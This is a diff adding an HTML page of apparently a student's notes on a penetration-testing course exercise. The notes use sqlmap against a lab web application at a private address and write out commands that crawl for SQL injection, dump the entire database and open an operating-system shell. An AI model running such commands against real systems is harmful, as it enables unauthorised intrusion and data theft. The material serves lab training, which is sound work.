@@ -1,0 +1,41 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises-13.6.1-Sqlmap</title>
+</head><body>13.6.1 - Exercises<br/>
+1. Use the sqlmap crawl option to enumerate the various pages of the vulnerable<br/>
+web application and search for SQL injection vulnerabilities.<br/>
+2. Use sqlmap to obtain a full dump of the database.<br/>
+3. Use sqlmap to obtain an interactive shell.<br/>
+4. Use sqlmap in the lab network to gather information on various targets.<br/>
+5. Use sqlmap in the lab network to obtain a shell on a target machine. Can you<br/>
+exploit the SQL injection manually?<br/>
+<br/>
+1.<br/>
+<b>root@:~&gt; sqlmap -u http://10.11.10.124 --crawl=1</b><br/>
+<br/>
+2.<br/>
+<b>root@:~&gt; sqlmap -u http://10.11.10.124/comment.php?id=738 --dbms=mysql --dump --threads=5</b><br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+3.<br/>
+<b>root@:~&gt; sqlmap -u http://10.11.10.124/comment.php?id=738 --dbms=mysql --os-shell</b><br/>
+<img src="screenshot 3.png" /><br/>
+<br/>
+<span style="color: #ff0000">4. &amp; 5<br/>
+Do this after the other exercises. This is an actual attack on a lab target. Come back and complete later. Use this forum for reference: https://forums.offensive-security.com/showthread.php?6809-13-6-1-4-Sqlmap-on-the-labs/page2&amp;highlight=tamper<br/>
+<br/>
+"For anyone having trouble still finding machines to do this exercise on, do not fret, they exist. I ran the same scan twice and the first time nothing came up, and the second time, it gave a POC for an injection method. I<b>t might not be a machine or port you would immediately think to use it on, so keep looking</b>. Make sure to really dig in to sqlmap and learn the parameters you can use. <b>sqlmap -hh </b>is a good starting point"<br/>
+<br/>
+It's a very frustrating exercise and it's certainly out of place: where all previous exercises gave you everything you needed to proceed, in this case the target you're looking for is pretty well hidden. It's not in a place where you'd usually expect it, almost forcing you to tackle the exercise only when you find a relevant target in the labs.<br/>
+<br/>
+</span><span style="color: #ff0000">It's not necessarily useless, because it helps you practice your enumeration and to do another SQLi attack... But yeah, frustrating.</span><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
